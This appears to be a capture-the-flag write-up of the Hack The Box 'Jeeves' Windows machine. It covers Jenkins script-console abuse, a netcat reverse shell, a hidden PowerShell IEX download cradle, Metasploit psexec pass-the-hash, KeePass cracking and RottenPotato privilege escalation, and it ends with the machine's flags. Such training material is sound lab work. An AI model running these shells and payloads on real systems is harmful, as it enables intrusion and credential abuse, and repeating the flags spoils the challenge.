---
layout: post
title:  "HTB Jeeves Windows"
tags: HTB, groovy, rottenpotato, john2keepass
---

# Recon
1. Nmap
```ruby
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```
2. We Dirbuster to find out the directories running on port 50000
![](https://lh3.googleusercontent.com/_afaZLU2r7PSsRJNlxpfM8UkyjsVbg6g8-1q85Q31pA-5CB_W0-cBRwACFTsE3cod1P26WJo78fFhm3EfoTMnTRoUzNeu223cJ20e1OGONEm8cr4S32otLqEsOEmdKU-va4vkY8eYdc1yCsL0H5tTxNEs5G595qg540jwIVNptwK2XqpEf3jtUgdMY7dt-wPnFLbydXqY05RKIRAvS5uCc9gzmYazY2XIDJY4ytIXmW-z0rGHLZeYilfeoZGdkaY5ei7P8ja2Pv2SL4aPq2lINQL5zS7_H18WLcY-pGSGe9yooMTpZlH5W45fsqn5eA4daF0OZ8bGnSBJJeJTyJT05KXz-CGwsJtEWxmbyTJzrN0IhkEE5nZl0XJ1gPTzuv4kNDFP1OvDefKYTLL3fKxJZZoVKtW7SJAdye7Ul6NimfGXyGvGnrdJIi--lQpKuS9wilTDRAHw6R7pWc13AjelcsL0LtUc-1s8tDxV02KJm-KdHXEDXUviW5n915DxNK8gfRnCdnR5i9qtiz0rqaB0F6kJ114EhwwC4qMKfnyu42rMQbGrebQXGLQRqY2-O41EG7Fp5t_NgJFq3Ulin7nbT3NzRfqM8N5SuCwPYhCqQBlsWF824xZzqonarSURAPU0hAoBmsF-UWXB0HfV9m11tdDJU-OycSAgW5daX-ty4aSU2LiT2a7IvA=w584-h209-no)

3. /askjeeves/ has a Jekins app running
![](https://lh3.googleusercontent.com/Jj_T1StwVe2aThqjKb8ybZ3Ythca4n9qyXUwzI0SnGlu_QoIU1wknCBMWre8iu7hq7qx27D6Ypo_rGBWsguoiwYiEnNMpYlMirqT_HUIzl6QQcoS0bbg7oLsAfc57D8iOVkh9sUiOzVxJ2TkPTa_TIUhwSpNhZE5OHkEJwKiZJs5VCuV9hflHd5vXp4mM8iDlhdEMYotLpDtuQRxxjwXotZyfQtWy59PAcGn1mzTPyTbBNwxkIBlYf_HxMXugwl8P25YDWc8Gqei_npEvzSFTIEwGrbdy-XeW-jk0HZoJ2TwherUMO01qV7ITn-v4_uX5GbLhgKP3iMqy2VqtjYGNVRn28nseTHok0AN9sRcoSIyTaPqUn_-5ErL2h3_JIipQSetVYsosRv55wCUVji94bKP8HDPnKuhGKwt_87D9E2SRo9OL4sHs9EaHsBzfxVmZSEDK1pZJ6NEhZsOmzWeuOjjOpXOojvpP32C09eKfymOJHtKTCZ_PR2Edr9xSVuewwRZ605eCjPYjbkTU5FN3zjoKinaUTkCreIqnc_AIVmNp2fwDtYtS_AdWCg3gJJ5iaWjB4sxo4iKw1D9Pm2gzYno3pJ8exVsC8aDZKB7uZU9UWH4YMivbUSS2HjmJz_cLeWBUDEirs-8FiumgfXEwQuabGMbi5cjEHkDilL8PXhLXPtjEGoWqEA=w632-h364-no)

4. To get admin without authenticating:
```ruby
http://10.10.10.63:50000/askjeeves/securityRealm/user/admin/
```

# Exploitation Method 1

1. On Jenkins create a new Item “Execute Windows bash command” and select “Freestyle Project”
2. Select “Add building Step” and select  “Execute Windows bash command” 
3. On the bash console type 
```ruby
powershell wget "http://10.10.14.14/nc.exe" -outfile "nc.exe" 
nc.exe -e cmd.exe 10.10.14.14 9999
```
4. Start apache and place nc.exe for download 
5. Set up nc to listen up
6. Run the shell on jenkins 

Optional and recommended: you can also create a msfvenom shell and multihadler to catch it 

# Privilege Escalation Method 1
1. Download CEH.kdbx keepass file
2. Use john2keepass to create a hashdump file
3. crack the has using john format=KeePass and wordlist=rockyou.txt
4. we obtain the pass : CEH:moonshine1
5. Install Keepass2 : apt-get install keepass2
6. NTLM hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
7. Using msf windows smb to connect using the keepass creds   
```ruby
use exploit/windows/smb/psexec
msf exploit(windows/smb/psexec) > set rhost 10.10.10.63
msf exploit(windows/smb/psexec) > set smbuser administrator
msf exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
msf exploit(windows/smb/psexec) > set lport 8888
msf exploit(windows/smb/psexec) > exploit
```
8. There is an alternate data stream applied to the ROOT flag. to view flag
dir /R
more < hm.txt:root.txt

# Exploitation Method 2
1. On Jenkins, create a reverser Groovy shell on the “script console” under “manage Jenkins” tab and run it
![](https://lh3.googleusercontent.com/FQ5o3fWatVzanE6muqXIeYxVxlS8jQPi6Bv8_U5FUys52OShe0tsZ4D6rlHXkyLFGibxeeLQRIHHcyoBpviboovTRMaBXEqb6o5THcYwj61z0rj1JnDcdDkV8dbvp7PD-cm7xzZgpMWPIpRXZ0xs6MYARFaQI4jUb2tjIC2KM2qzWnPFOkHES1Lgdq88OEtn-2mdg2uNf3fa_6jal1iQP34tn7m_JjvE4ssIVQWENE-F_bPJ_C-jPvohYjL_5chRkq1Kx_LKAKMyaF6e-msKgVOSaSEySgrhC3c6vtmUFtD5hSy4EjrxadEcsVs0m_QcqJxcBLLdAbGCeu_AgXzHuThcB9yozRZLTHi5NRipm6cmE56XYLGM4n-7wcr04P7IT5EPjbblF8bW5eFBuCx50z6fOkQTNbVyqJT-UAj6flFYpgzepqkJ_iY2Gd98EO6pPCMyh0-TSfGozdMyfSYCRns0eDiEK3em0_IJDtUSTcTtcr9MtcumII-3hTZbIKX0mWotQ8125hiaM-fnJT4iBlFp0obvK7sroscqZn98mpa65Gy_6iOfHml05eIVQZxiM9gAV1Zm7j0itM8Q95oXnOys2HJyAakhnqV-3CX8cz0eIj9ZxMBZ97MTo7IfaWprlmx16hOODWA5PVCzyxXb80MXjzLVhwZ9Lt9n9QOYg81xVttQpxVmPKI=w503-h125-no)

2. Set up an nc listener to recieve the shell
3. Spawn a meterpreter shell:
```ruby
use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) > set target 2
msf exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set lhost 10.10.14.28
msf exploit(multi/script/web_delivery) > set srvhost 10.10.14.28
msf exploit(multi/script/web_delivery) > exploit
```
4. We paste the following generated code into the netcat listener and meterpreter session should be created
```ruby
powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.14.34:8080/MHGDnJdwHT');
powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.14.34:8080/MHGDnJdwHT');
```
![](https://lh3.googleusercontent.com/cWUwdooZ0YmIq8lxngjJOvsdkv12Wn4IHBeoHD_JyecTa_NWPth3Smo34rumlM0lWemLXHI4yTHgA7ckuq9mJZz0atCu8Ehaxjr207WEBVlpmzCJUgRK-aMFfOVZX6nCs7LBF8QdYQwPtVsj-l8ppm8g5qcswPARi83sk9PY82rTABlC1IH6jWpC2wF0HwPI6bzV6rwSYRKcdq6jw5y3FhQiaRu9UEvEOAK6uVpTcIdo-0f7G-68Qoj9d2YFPxGPkcvFwnGFMu4MPDYQVES6a6HCAVI4ForSBJdmZFi83obZYVcWhMSXCOEzwaF3ru1PwextetH8J4KkVqzfu54NIchmHzzItE0opaMcld6y2_Zk41KqUx-BbGrWR4lqzMrI3zV_J6UmfMrm8QEgRds6CUVWiGTRutdEXkPaPTfegCDKMwQyQ4ntls48u_if0mXYgzI4cVICHX82HirOYw8gnFjnB_r5avyTPOUh3PpAw9t4pLVvV_hBzKuSIuXNxZ6i9pPD87B79rr4KKn8-FkaJGv0MsOjPVYe-EW_YgVzT-955tZM-NK7Xrk5KkL874ey0IxpzsMdouflQkOJDu0gtaEsHOmE-IzB0AbbcTYgZRur8B3aNNV7sKxhkihedFuiYSLCmR4_oTSpW_Eq9rMblbUXywBvVfjgvAzPSr1wAM54O4qtgGWU2IM=w601-h240-no)
![](https://lh3.googleusercontent.com/4geGjhzpOMMJVbYdiXGbEOjRrG6fsO62THAFzVeRBt82R4xT3T-D7Te39MY-_8V-gmute5NX_tHh89Zkt_f2YCjem3ibxspd9VzBRTMHE0rTotUSvYzBNbvJ4mX1C3XzSI9d_Dv0sm44DQoYkfRI-TAsqBNJhAG7XuQ_YJQEiLU0vOD8ONN2h0NP4RZGQbLUTJM3JoZsr1v4zoJcM4opPthsqa3eitbAPsmgb6DJTL21Z-mYiiMsemkoVRtqITd2QbXtUZH9ye6UsJZJCGYcEnvCQ_T9rl5mSBWtYFq4Nb_bQIWB5K-xhwegATF79SbfgOb0jfBzAt16Htwoqyym9nt-NyHUzhynQjaO3ouOvLyZAIS3Y8B4gDO6B6c4-X8dTHLXq_o6x7-3tScUfgw7EaWhhHTm_6rQuwez7g_o9zh24RgCi-kgjlHrwev9KwNRU508Dog4Ze3JVeewLX9OUXJ5DxBMm7RkiuLQvHdeBnvmzYAe3d3htrIFuJv3TEJN942rxS1uxcBb5HhA6wO5arpA8OiWK_8Bd4VGQbwEjVpnmnjDECIDkGV41CSN1B1ZvQZgbr3qHgWH-WYn-WCXQB3Zx4tuR-xDj_fvRt3J3VzxUZ0ayTwTBHDBWr_BHznKcs4N1YdzecsLIpQ-EDlvIox7Ojzzyq9NHFXefheTVbzxgCSv55UU82k=w627-h269-no)
# Privilege Escalation Method 2

1. Use Windows Exploit Suggesters
2. We use the Vuln MS16-075 and we upload RottenPotato.exe to the target machine
3. then we load meterpretert incognito: load incognito
4. we execute the rottenpotato.exe file
5. then we type:

```ruby
impersonate_token "NT AUTHORITY\SYSTEM"
```
and finally we get root level access.

# Flags
```ruby
| ROOT | afbc5bd4b615a60648cec41c6ac92530 |
| USER | e3232272596fb47950d59c4cf1e7066a |
```



